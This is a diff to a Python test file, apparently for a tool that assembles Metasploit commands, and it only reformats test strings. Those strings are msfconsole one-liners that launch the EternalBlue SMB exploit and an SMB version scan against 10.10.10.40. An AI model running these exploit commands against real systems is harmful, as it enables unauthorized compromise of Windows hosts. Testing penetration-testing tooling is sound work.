@@ -263,7 +263,10 @@ def test_msfconsole_lhost_addition(settings):
         },
         command_candidates=[
             CommandInputFactory(
-                command="msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; run; exit -y\"",
+                command=(
+                    "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; "
+                    "set RHOSTS 10.10.10.40; run; exit -y\""
+                ),
                 timeout_sec=60
             )
         ]
@@ -294,7 +297,10 @@ def test_msfconsole_with_existing_lhost(settings):
         },
         command_candidates=[
             CommandInputFactory(
-                command="msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 192.168.1.5; run; exit -y\"",
+                command=(
+                    "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; "
+                    "set RHOSTS 10.10.10.40; set LHOST 192.168.1.5; run; exit -y\""
+                ),
                 timeout_sec=60
             )
         ]
@@ -320,7 +326,10 @@ def test_msfconsole_non_exploit_module(settings):
         },
         command_candidates=[
             CommandInputFactory(
-                command="msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 10.10.10.40; run; exit -y\"",
+                command=(
+                    "msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; "
+                    "set RHOSTS 10.10.10.40; run; exit -y\""
+                ),
                 timeout_sec=60
             )
         ]
